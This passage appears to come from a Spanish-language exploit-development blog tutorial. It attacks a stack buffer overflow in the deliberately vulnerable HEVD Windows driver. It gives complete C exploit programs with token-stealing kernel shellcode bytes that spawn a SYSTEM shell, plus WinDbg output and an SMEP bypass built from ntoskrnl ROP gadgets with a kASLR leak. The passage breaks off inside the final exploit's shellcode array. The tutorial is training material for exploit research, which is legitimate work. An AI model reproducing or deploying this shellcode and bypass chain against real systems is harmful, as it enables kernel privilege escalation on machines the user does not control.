<code><span class="ro">0: kd> </span><span class="p">bp HEVD!TriggerBufferOverflowStack + 0x10b  

</span><span class="ro">0: kd></span><span class="p"> g</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de ejecutar el exploit podemos ver que la dirección de retorno ahora tiene como valor algunos de los bytes que contenia la cadena creada con <code class="language-plaintext highlighter-rouge">cyclic</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">exploit.exe  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">g
Breakpoint 0 hit
HEVD!TriggerBufferOverflowStack+0x10b:  
fffff803`399666bf c3              ret

</span><span class="ro">0: kd></span><span class="p"> dqs rsp L1
ffff8909`bd3b8788  6b616161`6161616a</span>
</code></pre></div></div><br>

<p class="plain-text">Ya con la dirección podemos calcular el offset nuevamente utilizando <code class="language-plaintext highlighter-rouge">cyclic</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cyclic </span><span class="p">-n 8 -l 0x6b6161616161616a  
2072</span>
</code></pre></div></div><br>

<p class="plain-text">Sabemos que después de rellenar <code class="language-plaintext highlighter-rouge">2072</code> bytes tenemos la dirección de retorno, entonces reservaremos un nuevo espacio llamado <code class="language-plaintext highlighter-rouge">shellcode</code> donde copiaremos un total de <code class="language-plaintext highlighter-rouge">64 C's</code>, luego el puntero a shellcode lo copiaremos a payload después de <code class="language-plaintext highlighter-rouge">2072 A's</code> por lo que el controlador deberia intentar ejecutar las <code class="language-plaintext highlighter-rouge">C's</code> en el <code class="language-plaintext highlighter-rouge">ret</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include </span><span class="s">&ltstdio.h>

</span><span class="na">BYTE </span><span class="p">sc[</span><span class="mi">64</span><span class="p">] </span><span class="o">=</span><span class="p"> {
    </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">,
    </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">,
    </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">,
    </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">,
    </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">,
    </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">,
    </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">,
    </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">, </span><span class="mi">0x43</span><span class="p">,
};

</span><span class="no">int </span><span class="na">main</span><span class="p">() {
    </span><span class="na">LPVOID </span><span class="p">payload </span><span class="o">= </span><span class="p">VirtualAlloc(</span><span class="mi">NULL</span><span class="p">, </span><span class="mi">2080</span><span class="p">, MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    </span><span class="na">LPVOID </span><span class="p">shellcode </span><span class="o">= </span><span class="p">VirtualAlloc(</span><span class="mi">NULL</span><span class="p">, </span><span class="o">sizeof</span><span class="p">(sc), MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload, </span><span class="mi">2072</span><span class="p">, </span><span class="s">'A'</span><span class="p">);
    RtlCopyMemory(shellcode, sc, </span><span class="o">sizeof</span><span class="p">(sc));

    </span><span class="o">*</span><span class="p">((</span><span class="na">ULONGLONG </span><span class="o">*</span><span class="p">) ((</span><span class="na">BYTE </span><span class="o">*</span><span class="p">) payload </span><span class="o">+ </span><span class="mi">2072</span><span class="p">)) </span><span class="o">= </span><span class="p">(</span><span class="na">ULONGLONG</span><span class="p">) shellcode;

    </span><span class="na">HANDLE </span><span class="p">handle </span><span class="o">= </span><span class="p">CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">HacksysExtremeVulnerableDriver"</span><span class="p">, GENERIC_READ </span><span class="o">| </span><span class="p">GENERIC_WRITE, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  

    </span><span class="o">if </span><span class="p">(handle </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">puts</span><span class="p">(</span><span class="s">"[-] Failed to get handle"</span><span class="p">);
        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
    }

    DeviceIoControl(handle, </span><span class="mi">0x222003</span><span class="p">, payload, </span><span class="mi">2080</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Ejecutamos el exploit y ahora la dirección de retorno apunta a <code class="language-plaintext highlighter-rouge">0x209494a0000</code> y esta dirección de memoria contiene las <code class="language-plaintext highlighter-rouge">C's</code> por lo que ya podemos ejecutar instrucciones</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">g
Breakpoint 0 hit
HEVD!TriggerBufferOverflowStack+0x10b:
fffff806`430f66bf c3              ret

</span><span class="ro">0: kd></span><span class="p"> db poi(rsp) L40
00000209`494a0000  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
00000209`494a0010  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
00000209`494a0020  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
00000209`494a0030  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  </span>
</code></pre></div></div><br>

</section>
<section class="post" id="exploit">
<br><h3 class="post-title">Exploit</h3><br>

<p class="plain-text">Finalmente solo nos queda modificar el <code class="language-plaintext highlighter-rouge">shellcode</code>, para ello utilizaremos un <a href="https://github.com/kevincillo32/ExploitDevelopment/blob/main/shellcode/token_stealing.asm">token stealing</a>, este shellcode esta diseñado para tomar el token del proceso <code class="language-plaintext highlighter-rouge">SYSTEM</code> y copiarlo a nuestro proceso actual por lo que deberiamos obtener sus privilegios, luego de ejecutarlo simplemente ejecutaremos una <code class="language-plaintext highlighter-rouge">cmd.exe</code> para obtener una shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include </span><span class="s">&ltstdio.h>

</span><span class="na">BYTE </span><span class="p">token_stealing[</span><span class="mi">120</span><span class="p">] </span><span class="o">=</span><span class="p"> {</span><span class="mi">
    0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi">
    0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0xc3</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi">
    0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi">
    0x66</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi">
    0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x92</span><span class="p">,</span><span class="mi"> 0x90</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi">
    0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xaa</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0x68</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x4c</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9a</span><span class="p">,</span><span class="mi"> 0x78</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xa2</span><span class="p">,</span><span class="mi">
    0x80</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xf8</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x07
</span><span class="p">};

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> payload </span><span class="o">= </span><span class="p">VirtualAlloc(</span><span class="mi">NULL</span><span class="p">, </span><span class="mi">2080</span><span class="p">, MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    </span><span class="na">LPVOID</span><span class="p"> shellcode </span><span class="o">= </span><span class="p">VirtualAlloc(</span><span class="mi">NULL</span><span class="p">, </span><span class="o">sizeof</span><span class="p">(token_stealing), MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload, </span><span class="mi">2072,</span><span class="s"> 'A'</span><span class="p">);
    RtlCopyMemory(shellcode, token_stealing,</span><span class="o"> sizeof</span><span class="p">(token_stealing));

    </span><span class="o">*</span><span class="p">((</span><span class="na">ULONGLONG </span><span class="o">*</span><span class="p">) ((</span><span class="na">BYTE </span><span class="o">*</span><span class="p">) payload </span><span class="o">+ </span><span class="mi">2072</span><span class="p">)) </span><span class="o">= </span><span class="p">(</span><span class="na">ULONGLONG</span><span class="p">) shellcode;

    </span><span class="na">HANDLE </span><span class="p">handle </span><span class="o">= </span><span class="p">CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">HacksysExtremeVulnerableDriver"</span><span class="p">, GENERIC_READ </span><span class="o">| </span><span class="p">GENERIC_WRITE, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  

    </span><span class="o">if </span><span class="p">(handle </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">puts</span><span class="p">(</span><span class="s">"[-] Failed to get handle"</span><span class="p">);
        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
    }

    DeviceIoControl(handle, </span><span class="mi">0x222003</span><span class="p">, payload, </span><span class="mi">2080</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="no">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit deberiamos pasar del usuario llamado <code class="language-plaintext highlighter-rouge">user</code> con bajos privilegios a <code class="language-plaintext highlighter-rouge">nt authority\system</code> que es el usuario con máximos privilegios sobre el equipo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop></span><span class="am"> exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.  

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

<section class="post" id="smep">
<br><h3 class="post-title">SMEP</h3><br>

<p class="plain-text">El exploit anterior funciona bien sin embargo aún hay algo a tener en cuenta, este corria con la protección <code class="language-plaintext highlighter-rouge">SMEP</code> deshabilitada temporalmente sin embargo a partir de <code class="language-plaintext highlighter-rouge">Windows 8</code> todos los windows actuales lo tienen activado por defecto, entonces veamos que pasa ahora si ejecutamos el exploit, al ejecutar el <code class="language-plaintext highlighter-rouge">ret</code> e intentar interpretar la primera instrucción del shellcode nos lanza un <code class="language-plaintext highlighter-rouge">BSOD</code> y este muestra el error <a href="https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/bug-check-0xfc---attempted-execute-of-noexecute-memory">ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY</a> y no podemos ejecutarlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
HEVD!TriggerBufferOverflowStack+0x10b:
fffff807`68b466bf c3              ret

</span><span class="ro">0: kd></span><span class="p"> p
000001f3`b6260000 65488b142588010000 mov   rdx,qword ptr gs:[188h]

</span><span class="ro">0: kd></span><span class="p"> p
KDTARGET: Refreshing KD connection
*** Fatal System Error: 0x000000fc (0x000001F3B6260000,0x00000000009A6867,0xFFFFB7082817EFC0,0x0000000080000005)  

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff807`4de077a0 cc              int     3

</span><span class="ro">0: kd></span><span class="p"> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY (fc)
An attempt was made to execute non-executable memory.  The guilty driver
is on the stack trace (and is typically the current instruction pointer).
When possible, the guilty driver's name is printed on
the BugCheck screen and saved in KiBugCheckDriver.
Arguments:
Arg1: 000001f3b6260000, Virtual address for the attempted execute.
Arg2: 00000000009a6867, PTE contents.
Arg3: ffffb7082817efc0, (reserved)
Arg4: 0000000080000005, (reserved)</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-kernel/stack-overflow/10.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/10.png"></p></div></a>

<p class="plain-text">El <a href="https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S_0.pdf">SMEP</a> impide que se pueda ejecutar la memoria de modo usuario desde modo kernel, sin embargo esta protección es controlada por el bit <code class="language-plaintext highlighter-rouge">20</code> del registro <code class="language-plaintext highlighter-rouge">cr4</code> por lo que si cambiamos su valor a <code class="language-plaintext highlighter-rouge">0</code> podriamos deshabilitarlo y ejecutar el shellcode</p>
<a href="/exploit-development/windows-kernel/stack-overflow/11.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/11.png"></p></div></a>

<p class="plain-text">Entonces lo unico que necesitamos es tomar el valor en binario del registro <code class="language-plaintext highlighter-rouge">cr4</code> cambiando el bit <code class="language-plaintext highlighter-rouge">20</code> por <code class="language-plaintext highlighter-rouge">0</code> y obtenemos su valor equivalente en hex a <code class="language-plaintext highlighter-rouge">0x250ef8</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> .formats cr4
Evaluate expression:
  Hex:     00000000`00350ef8
  Decimal: 3477240
  Decimal (unsigned) : 3477240
  Octal:   0000000000000015207370
  Binary:  00000000 00000000 00000000 00000000 00000000 00110101 00001110 11111000
  Chars:   .....5..
  Time:    Mon Feb  9 23:54:00 1970
  Float:   low 4.87265e-039 high 0
  Double:  1.71798e-317
  
</span><span class="ro">0: kd></span><span class="p"> .formats 0y1001010000111011111000
Evaluate expression:
  Hex:     00000000`00250ef8
  Decimal: 2428664
  Decimal (unsigned) : 2428664
  Octal:   0000000000000011207370
  Binary:  00000000 00000000 00000000 00000000 00000000 00100101 00001110 11111000
  Chars:   .....%..
  Time:    Wed Jan 28 20:37:44 1970
  Float:   low 3.40328e-039 high 0
  Double:  1.19992e-317</span>
</code></pre></div></div><br>

<p class="plain-text">Como no podemos ejecutar shellcode haremos <code class="language-plaintext highlighter-rouge">ROP</code> para cambiar el bit, para hacerlo podemos buscar <code class="language-plaintext highlighter-rouge">gadgets</code> dentro del controlador o el kernel, sin embargo los gadgets del propio driver son bastante limitados por lo que usaremos <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code>, el primer gadget guarda un qword en <code class="language-plaintext highlighter-rouge">rcx</code> y el segundo mueve el valor de <code class="language-plaintext highlighter-rouge">rcx</code> al registro <code class="language-plaintext highlighter-rouge">cr4</code>, sin embargo aun tenemos un problema bastante importante, la protección <code class="language-plaintext highlighter-rouge">kASLR</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ropper</span><span class="p"> --file ntoskrnl.exe -I 0x0 --console  
</span><span class="ve">[INFO]</span><span class="p"> Load gadgets for section: .text
</span><span class="ve">[LOAD]</span><span class="p"> loading... 100%
</span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%
</span><span class="ro">(ntoskrnl.exe/PE/x86_64)> </span><span class="p">search pop rcx; ret;
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rcx; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: ntoskrnl.exe
</span><span class="ro">0x00000000002163ec</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rcx</span><span class="az">; </span><span class="am">ret</span><span class="az">;

</span><span class="ro">(ntoskrnl.exe/PE/x86_64)> </span><span class="p">search mov cr4, rcx; ret;
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: mov cr4, rcx; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: ntoskrnl.exe
</span><span class="ro">0x00000000003a06a7</span><span class="p">:</span><span class="am"> mov</span><span class="p"> cr4, rcx</span><span class="az">; </span><span class="am">ret</span><span class="az">;

</span><span class="ro">(ntoskrnl.exe/PE/x86_64)></span>
</code></pre></div></div><br>

<p class="plain-text">Necesitamos la dirección base del kernel sin embargo esta es bastante facil de obtener con el primer valor del array al utilizar la función <code class="language-plaintext highlighter-rouge">EnumDeviceDrivers</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
</span><span class="na">DWORD</span><span class="p"> needed;

EnumDeviceDrivers(drivers,</span><span class="mi"> 1024</span><span class="p">,</span><span class="o"> &</span><span class="p">needed);  
</span><span class="na">LPVOID</span><span class="p"> ntoskrnl_base </span><span class="o">=</span><span class="p"> drivers[</span><span class="mi">0</span><span class="p">];</span>
</code></pre></div></div><br>

<p class="plain-text">Después de escribir los <code class="language-plaintext highlighter-rouge">56</code> bytes escribiremos <code class="language-plaintext highlighter-rouge">4 qwords</code>, los primeros 2 guardan el nuevo valor de <code class="language-plaintext highlighter-rouge">cr4</code> en <code class="language-plaintext highlighter-rouge">rcx</code>, el tercero mueve a <code class="language-plaintext highlighter-rouge">cr4</code> el valor en <code class="language-plaintext highlighter-rouge">rcx</code> deshabilitando asi el <code class="language-plaintext highlighter-rouge">SMEP</code> y el ultimo salta al shellcode a ejecutar en el modo usuario</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">ULONGLONG</span><span class="o"> *</span><span class="p">rop </span><span class="o">=</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="o"> *</span><span class="p">) ((</span><span class="na">ULONGLONG</span><span class="p">) payload </span><span class="o">+ </span><span class="mi">56</span><span class="p">);

</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) ntoskrnl_base</span><span class="o"> +</span><span class="mi"> 0x2163ec</span><span class="p">; </span><span class="c1">// pop rcx; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) </span><span class="mi">0x350ef8</span><span class="o"> ^</span><span class="mi"> 1</span><span class="no">UL</span><span class="o"> << </span><span class="mi">20</span><span class="p">;</span><span class="c1">     // cr4 value
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) ntoskrnl_base</span><span class="o"> +</span><span class="mi"> 0x3a06a7</span><span class="p">; </span><span class="c1">// mov cr4, rcx; ret;  
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) shellcode;</span><span class="c1">                // token stealing</span>
</code></pre></div></div><br>

<p class="plain-text">El exploit final deberia bypassear la protección de <code class="language-plaintext highlighter-rouge">SMEP</code> y <code class="language-plaintext highlighter-rouge">kASLR</code> y funcionar en un <code class="language-plaintext highlighter-rouge">windows 10</code> completamente actualizado sin ninguna modificación necesaria</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include</span><span class="s"> &ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>
</span><span class="o">#include</span><span class="s"> &ltpsapi.h>

</span><span class="na">BYTE </span><span class="p">token_stealing[</span><span class="mi">120</span><span class="p">] </span><span class="o">=</span><span class="p"> {</span><span class="mi">
    0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi">
    0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0xc3</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi">
    0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi">
